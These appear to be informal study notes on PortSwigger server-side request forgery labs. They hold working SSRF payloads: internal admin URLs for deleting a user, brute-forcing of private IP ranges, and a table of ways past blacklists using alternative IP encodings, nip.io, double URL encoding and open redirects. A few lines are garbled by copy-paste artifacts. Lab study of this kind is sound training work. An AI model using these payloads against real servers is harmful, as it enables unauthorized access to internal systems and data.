First lab 1 : 
Solved by an , 
http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
TO
http%3A%2F%2Flocalhost/admin/delete?username=carlos

it will access some link behind the server, but here it was easily done, by localhost changig by that 



Lab 2 : 
http://192.168.0.68/

having this, 
and we incrementing the 68 
by bruteforce, 
and it revel the admin interface

here , basically the endpoint /product/stock 
will access in background stock endpoint via : http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1

here the 1 may also have an upto 255 , because of bit range of ip 
so we need to bruteforce to get an admin interface

http://192.168.0.121:8080/admin/delete?username=carlos


Lab 3 :  In this we cover an defence based ssrf
Many developers try to prevent SSRF by blocking known bad inputs using blacklists. For example, they reject any URL containing:
127.0.0.1
localhost
192.168.*
10.*
172.16.* to 172.31.* (private ranges)
.internal
/admin, /debug, etc.

For these defence we can use an : 
Use Alternative IP Representations of 127.0.0.1
Representation,How It Works,Example URL
Decimal - 2130706433 = 127.0.0.1
Octal - 0177.0.0.1 or 017700000001
Dotted decimal variants - "127.1, 127.0.1, 127.127.127.127"
Hexadecimal - 0x7f.0x0.0x0.0x1 → 0x7f000001firewall
Mixed formats,"Combine decimal, octal, hex",127.0.0.0177

Test like this : 
http://2130706433/admin
http://017700000001/admin

Register Your Own Domain That Resolves to 127.0.0.1
You can make any domain point to 127.0.0.1 via your local /etc/hosts file or DNS spoofing — but in labs, PortSwigger provides Burp Collaborator.

Example:
texthttp://127.0.0.1.nip.io/admin
→ nip.io resolves this to 127.0.0.1 automatically.
Or in Burp labs:
texthttp://your-unique-id.burpcollaborator.net/admin
The server resolves it → goes to localhost → bypasses blacklist that only blocks localhost or 127.0.0.1

3. Obfuscate Blocked Strings Using URL Encoding or Case Variation
Many filters do naive string matching.
Original,Encoded Example,Result After Decoding
127.0.0.1,127.0.0.%31,Becomes 127.0.0.1
localhost,%6c%6f%63%61%6c%68%6f%73%74,"Decodes to ""localhost"""
Double encoding,%252e%252e%252f → decodes twice to ../,Bypasses filters checking %2e%2e/

Case Variation
Some filters are case-sensitive:
LoCaLhOsT
LOCALHOST
127.0.0.1.toUpperCase() → doesn't trigger lowercase checks

Also works with paths:
/ADMIN, /AdMiN, etc.

Embedded Tabs/Newlines (rarely works now)
texthttp://localhost%09/admin
http://127.0.0.1%250a/admin

4. Use Open Redirects to Redirect to the Forbidden URL
This is one of the most powerful and common bypasses.
Idea:

Find an open redirect vulnerability elsewhere in the app (very common)
Example: https://example.com/redirect?url=https://google.com
Attacker can set: https://example.com/redirect?url=http://localhost/admin

Now send this full URL to the SSRF endpoint:texthttps://vulnerable.com/fetch?url=https://example.com/redirect?url=http://localhost/admin

Advanced Redirect Tricks

Use 301, 302, 303, 307, 308 — some filters only block 302
Redirect from HTTP → HTTPS or vice versa — some filters treat them differently
Use relative redirects: Location: /admin when base is internal
Chain multiple redirects

Example payload:
text?url=https://normal-external-site.com/redirect-to-localhost

Summary Table of Blacklist Bypass Techniques :  
Technique,Example Payload,Bypasses Filters Looking For
Decimal IP,http://2130706433/admin,"127.0.0.1, localhost"
Octal IP,http://017700000001/admin,Same
Alternative localhost,http://localhost:80@localhost,Simple checks
DNS that resolves to 127.0.0.1,http://127.0.0.1.nip.io/admin,Domain blacklists only
URL encoding,http://%31%32%37%2e%30%2e%30%2e%31/admin,Exact string match
Open redirect,http://example.com/redirect?url=http://localhost/admin,Direct internal access

solution for an lab : 
try : 
127.0.0.1 - > Blocked
127.1 -> accessed
127.1/admin -> blocked
127.1/admi%6e -> url encode of N - > %6e  --> blocker
127.1/admi%25%36%65  --> double URL encode -> access
